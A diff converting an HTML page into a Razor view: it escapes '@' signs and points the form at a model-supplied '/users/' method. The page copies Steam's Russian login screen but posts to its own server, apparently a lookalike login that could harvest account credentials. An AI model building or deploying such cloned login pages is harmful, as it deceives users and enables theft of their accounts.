@@ -22,7 +22,7 @@
 			display: none;
 		}
 
-		@media screen and (max-width: 910px) {
+		@@media screen and (max-width: 910px) {
 			#useless {
 				display: block;
 			}
@@ -68,7 +68,7 @@
 			</div>
 		</div>
 		<style>
-			@media screen and (max-width: 910px) {
+			@@media screen and (max-width: 910px) {
 				.header {
 					display: none;
 				}
@@ -87,7 +87,7 @@
 						</div>
 					</div>
 					<style>
-						@media screen and (max-width: 700px) {
+						@@media screen and (max-width: 700px) {
 							.login-wrapper, .login, .login-entry {
 								text-align: center;
 							}
@@ -96,7 +96,7 @@
 					<div class="form-container">
 						<div class="form-container-content">
 
-							<form class="form-container-input" action="/users/save_user" method="POST">
+							<form class="form-container-input" action="/users/@Model.MethodName" method="POST">
 								<div class="form-container-input-name">
 									<div class="textname">Войти, используя имя аккаунта</div>
 									<div></div>
@@ -141,7 +141,7 @@
 								</div>
 							</div>
 							<style>
-								@media screen and (max-width: 700px) {
+								@@media screen and (max-width: 700px) {
 									.form-container-qr {
 										display: flex;
 										flex-direction: column;
@@ -166,7 +166,7 @@
 			</div>
 		</div>
 		<style>
-			@media screen and (max-width: 700px) {
+			@@media screen and (max-width: 700px) {
 				.login-wrapper {
 					padding-top: 12px;
 					padding-bottom: 0px;
@@ -198,7 +198,7 @@
 			</div>
 		</div>
 		<style>
-			@media screen and (max-width: 700px) {
+			@@media screen and (max-width: 700px) {
 				.page-bottom {
 					flex-direction: column-reverse;
 				}
@@ -240,12 +240,12 @@
 					&nbsp; | &nbsp;<a href="https://partner.steamgames.com/steamdirect" target="_blank" rel="noreferrer">Дистрибуция Steam</a>
 					&nbsp; | &nbsp;<a href="https://help.steampowered.com/ru/?snr=1_44_44_">Служба поддержки</a>
 					&nbsp; | &nbsp;<a href="https://store.steampowered.com/digitalgiftcards/?snr=1_44_44_">Подарочные карты</a>
-					&nbsp; | &nbsp;<a href="https://steamcommunity.com/linkfilter/?url=http://www.facebook.com/Steam"><img src="https://store.cloudflare.steamstatic.com/public/images/ico/			ico_facebook.gif">Steam</a>
-					&nbsp; | &nbsp;<a href="http://twitter.com/steam"><img src="https://store.cloudflare.steamstatic.com/public/images/ico/ico_twitter.gif">@steam</a>
+					&nbsp; | &nbsp;<a href="https://steamcommunity.com/linkfilter/?url=http://www.facebook.com/Steam"><img src="https://store.cloudflare.steamstatic.com/public/images/ico/ico_facebook.gif">Steam</a>
+					&nbsp; | &nbsp;<a href="http://twitter.com/steam"><img src="https://store.cloudflare.steamstatic.com/public/images/ico/ico_twitter.gif">@@steam</a>
 				</div>
 			</div>
 			<style>
-				@media screen and (max-width: 910px) {
+				@@media screen and (max-width: 910px) {
 					.footer {
 						display: none;
 					}
@@ -254,14 +254,14 @@
 		</div>
 	</div>
 	<style>
-		@media screen and (max-width: 910px) {
+		@@media screen and (max-width: 910px) {
 			.page-content {
 				background: radial-gradient(rgba(24, 26, 33, 0) 0%, #181A21 100%) fixed no-repeat, url(https://store.cloudflare.steamstatic.com/public/shared/images/joinsteam/new_login_bg_strong_mask.jpg) center top no-repeat, #181A21;
 				max-width: 940px;
 			}
 		}
 
-		@media screen and (max-width: 700px) {
+		@@media screen and (max-width: 700px) {
 			.page-content {
 				background: radial-gradient(rgba(24, 26, 33, 0) 0%, #181A21 100%) fixed no-repeat, url(https://store.cloudflare.steamstatic.com/public/shared/images/joinsteam/new_login_bg_strong_mask_mobile.jpg) center top no-repeat, #181A21;
 			}
@@ -270,28 +270,3 @@
 </body>
 </html>
 
-
-
-<!-- using (SqlConnection connection = new SqlConnection(connectionString))
-			{
-				connection.Open();
-				SqlCommand command = new SqlCommand(sqlExpression, connection);
-				SqlDataReader reader = command.ExecuteReader();
-
-
-				if (reader.HasRows) // если есть данные
-				{
-
-					while (reader.Read()) // построчно считываем данные
-					{
-						int id = reader.GetInt32(0);
-						string name = reader.GetString(1);
-						string surname = reader.GetString(2);
-
-						Console.WriteLine("{0} \t{1} \t{2}", id, name, surname);
-					}
-				}
-
-				reader.Close();
-			}
--->
